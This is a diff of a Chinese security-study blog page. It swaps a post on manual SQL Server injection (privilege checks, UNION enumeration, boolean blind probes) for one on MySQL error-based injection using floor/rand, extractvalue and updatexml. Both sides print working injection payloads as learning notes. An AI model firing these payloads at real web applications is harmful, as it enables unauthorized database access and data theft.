@@ -19,29 +19,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="server手工注入用户权限sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限and 1&#x3D;(is_srvrolemember(‘sysadmin’))  &#x2F;&#x2F;返回正常为sadb权限：文件管理，数据库操作等and 1&#x3D;(is_member(‘db_owner’))  &#x2F;&#x2F;返回正常值为DB_OWNERpublic权限：数据库操作and 1&#x3D;(is_srvrolemember(‘pub">
+    <meta name="description" content="floor报错注入rand(0)与rand()的区别rand(0)相当于给rand()函数传递了一个参数然后rand()函数会根据0这个参数进行随机数生成rand()生成的数字是完全随机的,而rand(0)是有规律的生成 count(*)的作用count()是用来统计表中记录的一个函数,返回匹配条件的行数count(*)包含所有列,返回表中记录数,相当于统计表中的行数 group by的作用gro">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql 手工注入">
-<meta property="og:url" content="http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="sql注入之报错注入">
+<meta property="og:url" content="http://example.com/2023/01/14/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="The future is promising">
-<meta property="og:description" content="server手工注入用户权限sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限and 1&#x3D;(is_srvrolemember(‘sysadmin’))  &#x2F;&#x2F;返回正常为sadb权限：文件管理，数据库操作等and 1&#x3D;(is_member(‘db_owner’))  &#x2F;&#x2F;返回正常值为DB_OWNERpublic权限：数据库操作and 1&#x3D;(is_srvrolemember(‘pub">
+<meta property="og:description" content="floor报错注入rand(0)与rand()的区别rand(0)相当于给rand()函数传递了一个参数然后rand()函数会根据0这个参数进行随机数生成rand()生成的数字是完全随机的,而rand(0)是有规律的生成 count(*)的作用count()是用来统计表中记录的一个函数,返回匹配条件的行数count(*)包含所有列,返回表中记录数,相当于统计表中的行数 group by的作用gro">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-13T07:38:34.000Z">
-<meta property="article:modified_time" content="2023-01-13T11:19:13.582Z">
+<meta property="article:published_time" content="2023-01-14T10:29:18.000Z">
+<meta property="article:modified_time" content="2023-01-14T11:38:57.264Z">
 <meta property="article:author" content="清者">
-<meta property="article:tag" content="拼搏">
-<meta property="article:tag" content="奋斗">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">
+<link rel="canonical" href="http://example.com/2023/01/14/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/","path":"2023/01/13/sql手工注入/","title":"sql 手工注入"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/01/14/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","path":"2023/01/14/sql注入之报错注入/","title":"sql注入之报错注入"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>sql 手工注入 | The future is promising</title>
+<title>sql注入之报错注入 | The future is promising</title>
   
 
 
@@ -141,7 +139,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#server%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">server手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="nav-number">1.1.</span> <span class="nav-text">用户权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.2.</span> <span class="nav-text">一般步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">floor报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rand-0-%E4%B8%8Erand-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.1.</span> <span class="nav-text">rand(0)与rand()的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#count-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">count(*)的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group-by%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">group by的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.4.</span> <span class="nav-text">实例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">extractvalue报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">updatexml报错注入</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -202,7 +200,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/14/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/apple-touch-icon-next.png">
@@ -215,12 +213,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="sql 手工注入 | The future is promising">
+      <meta itemprop="name" content="sql注入之报错注入 | The future is promising">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sql 手工注入
+          sql注入之报错注入
         </h1>
 
         <div class="post-meta-container">
@@ -232,7 +230,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-01-13 15:38:34 / 修改时间：19:19:13" itemprop="dateCreated datePublished" datetime="2023-01-13T15:38:34+08:00">2023-01-13</time>
+      <time title="创建时间：2023-01-14 18:29:18 / 修改时间：19:38:57" itemprop="dateCreated datePublished" datetime="2023-01-14T18:29:18+08:00">2023-01-14</time>
     </span>
 
   
@@ -245,9 +243,12 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="server手工注入"><a href="#server手工注入" class="headerlink" title="server手工注入"></a>server手工注入</h2><h3 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><p>sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限<br>and 1=(is_srvrolemember(‘sysadmin’))  //返回正常为sa<br>db权限：文件管理，数据库操作等<br>and 1=(is_member(‘db_owner’))  //返回正常值为DB_OWNER<br>public权限：数据库操作<br>and 1=(is_srvrolemember(‘public’))  //public权限较低</p>
-<h3 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h3><p>name为所查东西的名称<br>判断注入点是否存在<br>sql i.aspx?id=1’  (报错)/‘-  -  (正常)/‘ and 1=1-  -  (正常)/‘ and 1&gt;1-  -  (空)<br>判断字段数<br>order by<br>联合查询获得系统信息<br>union select<br>获取当前数据库名<br>sql i.aspx?id=-1’ union select null,db_name(0),null–<br>?id=-1’ union select null,null,name from sys.databases where name != ‘master’ –<br>获取其他数据库名<br>sql i.aspx?id=-1’ union select null,db_name(1),null–<br>sql i.aspx?id=-1’ union select null,db_name(2),null–<br>?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 0 name from sys. databases)),null–<br>?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 1 name from sys. databases)),null–<br>获取当前数据表名<br>sql i.aspx?id=-1 union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’–<br>获取其他数据表名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’–<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’ and name !=’article’–<br>获取数据表中的一个字段名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)–<br>获取其他字段名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)</p>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>判断是不是sql server数据库<br>?id=1 and exists(select * from sysobjects)<br>?id=1 and exists(select count(<em>) from sysobjects)<br>判断数据库版本信息<br>?id=1’ and substring((select @@version),22,4)=2008–<br>判断数据库用户<br>?id=1’ and 1=(is_srvrolemember(‘sysadmin’))–<br>判断数据库名称的长度<br>?id=1’ and len(db_name())=4 –<br>判断数据库名称<br>?id=1’ and ascii(substring(db_name(),1,1))&gt;97 –<br>?id=1’ and ascii(substring(db_name(),1,1))=116 –<br>?id=1’ and ascii(substring(db_name(),2,1))=101 –<br>判断数据表的数量<br>?id=1’ and (select count(</em>) from test..sysobjects where xtype=’U’)=3–<br>判断第一个数据表的名称的长度<br>?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’)=5–<br>判断第二个数据表的名称长度<br>?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’ and name!=’users’)=7–<br>判断数据表名称的第一个字符<br>?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..sysobjects where xtype=’U’)=117–<br>判断数据表中列的数量<br>?id=1’ and (select top 1 count(*) from test..syscolumns where id=OBJECT_ID(‘users’))=3–<br>判断数据表中第一个字段的长度<br>?id=1’ and (select top 1 len(name) from test..syscolumns where id=OBJECT_ID(‘users’))=2–<br>判断数据表中第一个字段的名称<br>?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..syscolumns where id=OBJECT_ID(‘users’))=105–<br>(判断第二个后面加上and name!=’id’)<br>此外还有时间盲注</p>
+        <h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><h3 id="rand-0-与rand-的区别"><a href="#rand-0-与rand-的区别" class="headerlink" title="rand(0)与rand()的区别"></a>rand(0)与rand()的区别</h3><p>rand(0)相当于给rand()函数传递了一个参数然后rand()函数会根据0这个参数进行随机数生成<br>rand()生成的数字是完全随机的,而rand(0)是有规律的生成</p>
+<h3 id="count-的作用"><a href="#count-的作用" class="headerlink" title="count(*)的作用"></a>count(*)的作用</h3><p>count()是用来统计表中记录的一个函数,返回匹配条件的行数<br>count(*)包含所有列,返回表中记录数,相当于统计表中的行数</p>
+<h3 id="group-by的作用"><a href="#group-by的作用" class="headerlink" title="group by的作用"></a>group by的作用</h3><p>group by是用来进行分组查询的。对指定列的查询结果做分组统计，最终得到一个分组汇总表</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>id=1’ and  (select count(*),floor(rand(0)<em>2)as a from information_schema.tables group by a)– -<br>id=1’ and (select 1 from(select count(</em>),floor(rand(0)*2)as a from information_schema.tables group by a))– -<br>其中floor(rand(0)<em>2)会生成一个011011的序列，而且每次运行的时候都不变<br>所以count(</em>),floor(rand(0)*2)as a from users group by a运行的时候，第一次拿到的group by后面的值是0，在虚拟表中不存在，所以要再运算一次来获取group by后面的值，这时候获取的值是1<br>所以group by要进行两次运算</p>
+<h2 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h2><p>extractvalue(XML_document,XPath_string)<br>第一个参数：XML_document是string格式，为XML文档对象的名称，表示传入的目标XML文档<br>第二个参数：XPath_string(Xpath格式的字符串)，表示xml路径<br>作用：从目标XML中返回包含所查询的字符串<br>例：id=1 and (extractvalue(1,concat((select database()))))<br>    id=1 and (extractvalue(1,concat(‘~’,(select database()))))<br>    id=1 and (extractvalue(1,concat(‘/‘,(select database()))))</p>
+<h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p>updatexml(XML_document,XPath_string,new_value)<br>第一个参数：XML_document是string格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string(Xpath格式的字符串)<br>第三个参数：new_value,string格式，替换查找到的符合条件的数据<br>函数作用：改变文档中符合条件的节点的值</p>
 
     </div>
 
@@ -256,23 +257,16 @@
     
 
     <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%8B%BC%E6%90%8F/" rel="tag"># 拼搏</a>
-              <a href="/tags/%E5%A5%8B%E6%96%97/" rel="tag"># 奋斗</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/" rel="prev" title="sql注入之bypass技巧">
-                  <i class="fa fa-chevron-left"></i> sql注入之bypass技巧
+                <a href="/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" rel="prev" title="sql 手工注入">
+                  <i class="fa fa-chevron-left"></i> sql 手工注入
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/01/14/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="next" title="sql注入之报错注入">
-                  sql注入之报错注入 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
